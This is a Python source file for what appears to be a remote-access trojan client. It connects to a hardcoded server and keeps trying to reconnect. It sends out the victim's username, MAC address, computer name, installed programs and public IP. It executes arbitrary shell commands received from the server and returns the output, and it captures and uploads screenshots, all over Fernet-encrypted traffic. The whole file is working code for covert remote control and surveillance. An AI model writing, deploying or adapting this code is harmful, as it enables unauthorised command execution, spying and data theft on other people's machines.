import os

try:
    import socket
    import requests
    import json
    import threading
    import uuid
    import re
    import psutil
    import sys
    import subprocess
    import pyautogui
    import io
    import time
except:
    os.system("pip install requests uuid psutil pyautogui cryptography")
finally:
    import socket
    import requests
    import json
    import threading
    import uuid
    import re
    import psutil
    import sys
    import subprocess
    import pyautogui
    import io
    import time

#Cryptography start
from cryptography.fernet import Fernet
import base64

def crypt_client_init(key):
    print("Initializing cryptography with key " + key[:15] + "...")
    CRYPT_KEY = key.encode()
    CRYPT_KEY_SAFE = base64.urlsafe_b64encode(CRYPT_KEY)
    global cipher_suite
    cipher_suite = Fernet(CRYPT_KEY_SAFE)

def crypt_text_encode(text):
    try:
        cipher_suite
    except NameError:
        print("Cipher has not yet been initialized!")
        return text
    # Check if text is already bytes; if not, encode it
    if not isinstance(text, bytes):
        text = text.encode()
    return cipher_suite.encrypt(text)

def crypt_text_decode(text):
    try:
        cipher_suite
    except NameError:
        print("Cipher has not yet been initialized!")
        return text
    # Decrypt the text first
    decrypted_text = cipher_suite.decrypt(text)
    # Check if decrypted_text is bytes; if so, decode it to string
    if isinstance(decrypted_text, bytes):
        return decrypted_text.decode()
    return decrypted_text

#Cryptography end

server_port = 4556  # The port of the server
server_ip = "10.17.181.252" # The ip of the server

def is_already_running():
    current_pid = os.getpid()
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] != current_pid and proc.info['name'] == os.path.basename(__file__):
            return True
    return False

def CreateLogMessage():
    data = {
        "type": "data",
        "ip": {
            "global": GetGlobalIP(),
            "local": GetLocalIP()
        },
        "pc_info": {
            "username": os.getlogin(),
            "username_expanded": os.path.expanduser('~'),
            "logon_server": os.environ.get("LOGONSERVER"), 
            "uuid": str(uuid.UUID(int=uuid.getnode()).int),
            "mac_address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            "pc_name": os.environ.get("COMPUTERNAME"),
            "installed_programs": {
                "normal": GetInstalled(),
                "x86": GetInstalledx86()
            }
        }
    }
    return json.dumps(data)

def GetInstalled():
    program_files = os.environ.get("ProgramFiles")
    if program_files is None:
        return []
    return [name for name in os.listdir(program_files) if os.path.isdir(os.path.join(program_files, name))]

def GetInstalledx86():
    program_files_x86 = os.environ.get("ProgramFiles(x86)")
    if program_files_x86 is None:
        return []
    return [name for name in os.listdir(program_files_x86) if os.path.isdir(os.path.join(program_files_x86, name))]

def GetGlobalIP():
    return requests.get("http://icanhazip.com").text.strip()

def GetLocalIP():
    return socket.gethostbyname(socket.gethostname())

def send_message(client_socket, message):
    message = crypt_text_encode(message.encode())
    message_length = f"{len(message):08}".encode()
    client_socket.sendall(message_length + message)

def OnMessage(message):
    try:
        data = json.loads(crypt_text_decode(message))
        print("Received data with code: " + data["code"])
        if data["code"] == "established":
            crypt_client_init(data["key"])
            send_message(client_socket, CreateLogMessage())
        elif data["code"] == "request_public_ip":
            # Respond to a request for the public IP address
            public_ip = GetGlobalIP()
            response = json.dumps({"type": "public_ip", "ip": public_ip})
            send_message(client_socket, response)
        elif data["code"] == "shell_command":
            # Execute the shell command
            command = data["command"]
            print(f"Executing command: {command}")
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                data = {
                    "type": "shell_output",
                    "output": result.stdout.strip()
                }
                send_message(client_socket, json.dumps(data))
            except Exception as e:
                print(f"Error executing command: {e}")
        elif data["code"] == "screenshot":
            uuid = data["uuid"]
            screen = pyautogui.screenshot()
            buffered = io.BytesIO()
            screen.save(buffered, format="PNG")
            screenshot_data = buffered.getvalue()
            send_message(client_socket, json.dumps({"type": "screenshot", "uuid": uuid}))
            length_header = f"{len(screenshot_data):08}".encode()
            client_socket.sendall(length_header + screenshot_data)
    except Exception as e:
        print("Error processing message with code " + data["code"] + ": " + str(e))

def receive_message(client_socket):
    packet = client_socket.recv(1024)
    return packet.decode()

def MessageDecode(client_socket):
    while True:
        try:
            data = receive_message(client_socket)
            if data:
                OnMessage(data)
            else:
                print("Connection closed by the server.")
                break
        except Exception as ex:
            print(f"Error receiving data: {ex}")
            break
    reconnect_to_server()

if is_already_running():
    print("Already running client!")
    sys.exit(0)

def on_connect():
    print("Connected to server!")

    # Start the message receiving thread
    receive_thread = threading.Thread(target=MessageDecode, args=(client_socket,))
    receive_thread.start()

def try_connect(server_address):
    try:
        print("Attempting to connect to server...")
        client_socket.connect(server_address)
        return True
    except socket.error as e:
        print(f"Connection failed: {e}")
        return False

def connect_to_server():
    connectionTries = 0
    server_address = (server_ip, server_port)
    while connectionTries < 5:
        if try_connect(server_address):
            on_connect()
            return
        else:
            connectionTries += 1
            print("Couldn't connect to server, retrying in 5 seconds...")
            time.sleep(5)
    print("Couldn't connect to server, retrying in 30 seconds...")
    time.sleep(30)
    connect_to_server()

def reconnect_to_server():
    global client_socket
    client_socket.close()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect_to_server()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect_to_server()